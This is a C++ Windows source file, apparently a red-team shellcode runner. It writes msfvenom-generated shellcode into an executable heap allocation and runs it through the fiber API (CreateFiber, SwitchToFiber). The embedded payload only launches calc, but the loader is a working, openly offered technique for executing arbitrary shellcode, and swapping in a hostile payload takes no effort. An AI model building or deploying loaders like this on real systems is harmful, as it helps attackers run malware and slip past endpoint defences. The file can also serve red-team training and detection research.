// Shellcode runner via Fibers
// Shoutout to @0xHop for the very cool fiber technique
//
// There may be some unnecessary things in here, just trying to write it in a way that I can expand on later

#include <Windows.h>
#include <iostream>

// The docs said to write it this way...
#define FIBER_COUNT 1
#define PRIMARY_FIBER 0
#define ZERO_SIZE 0

int main()
{
    // msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc -b '\x00\x0a\x0d\x20' -f c
    unsigned char byteArray[] = "\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\xf9\x67\xfd\xf8\xe1\x9f\x7f\xf9\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x05\x2f\x7e\x1c\x11\x77"
        "\xbf\xf9\xf9\x67\xbc\xa9\xa0\xcf\x2d\xa8\xaf\x2f\xcc\x2a\x84"
        "\xd7\xf4\xab\x99\x2f\x76\xaa\xf9\xd7\xf4\xab\xd9\x2f\x76\x8a"
        "\xb1\xd7\x70\x4e\xb3\x2d\xb0\xc9\x28\xd7\x4e\x39\x55\x5b\x9c"
        "\x84\xe3\xb3\x5f\xb8\x38\xae\xf0\xb9\xe0\x5e\x9d\x14\xab\x26"
        "\xac\xb0\x6a\xcd\x5f\x72\xbb\x5b\xb5\xf9\x31\x14\xff\x71\xf9"
        "\x67\xfd\xb0\x64\x5f\x0b\x9e\xb1\x66\x2d\xa8\x6a\xd7\x67\xbd"
        "\x72\x27\xdd\xb1\xe0\x4f\x9c\xaf\xb1\x98\x34\xb9\x6a\xab\xf7"
        "\xb1\xf8\xb1\xb0\xc9\x28\xd7\x4e\x39\x55\x26\x3c\x31\xec\xde"
        "\x7e\x38\xc1\x87\x88\x09\xad\x9c\x33\xdd\xf1\x22\xc4\x29\x94"
        "\x47\x27\xbd\x72\x27\xd9\xb1\xe0\x4f\x19\xb8\x72\x6b\xb5\xbc"
        "\x6a\xdf\x63\xb0\xf8\xb7\xbc\x73\xe5\x17\x37\xf8\x29\x26\xa5"
        "\xb9\xb9\xc1\x26\xa3\xb8\x3f\xbc\xa1\xa0\xc5\x37\x7a\x15\x47"
        "\xbc\xaa\x1e\x7f\x27\xb8\xa0\x3d\xb5\x73\xf3\x76\x28\x06\x06"
        "\x98\xa0\xb0\x5b\x9e\x7f\xf9\xf9\x67\xfd\xf8\xe1\xd7\xf2\x74"
        "\xf8\x66\xfd\xf8\xa0\x25\x4e\x72\x96\xe0\x02\x2d\x5a\x7f\x62"
        "\xd3\xf3\x26\x47\x5e\x74\x22\xe2\x06\x2c\x2f\x7e\x3c\xc9\xa3"
        "\x79\x85\xf3\xe7\x06\x18\x94\x9a\xc4\xbe\xea\x15\x92\x92\xe1"
        "\xc6\x3e\x70\x23\x98\x28\x9b\x80\xf3\x1c\xf9";

    // Declare a bunch of stuff
    HANDLE hSnap;
    HANDLE hFiber;
    HANDLE hHeap;
    LPVOID MasterFiber[FIBER_COUNT];
    LPVOID hMemory;

    // Initialize The Local Process Handle
    hSnap = GetCurrentProcess();

    if (hSnap)
    {
        // Setup MasterFiber so we can schedule a runner fiber
        MasterFiber[PRIMARY_FIBER] = ConvertThreadToFiber(NULL);

        // Setup the heap
        hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, ZERO_SIZE, ZERO_SIZE);
        hMemory = HeapAlloc(hHeap, 0, sizeof(byteArray));
        WriteProcessMemory(hSnap, hMemory, byteArray, sizeof(byteArray), NULL);

        // Setup the runner fiber
        hFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)hMemory, NULL);

        // Switch execution context to runner fiber
        SwitchToFiber(hFiber);
    }
    else
    {
        std::cout << "We've been had!\n" << std::endl;
        return 0;
    }

    // Close Handle
    CloseHandle(hSnap);
    return 0;
}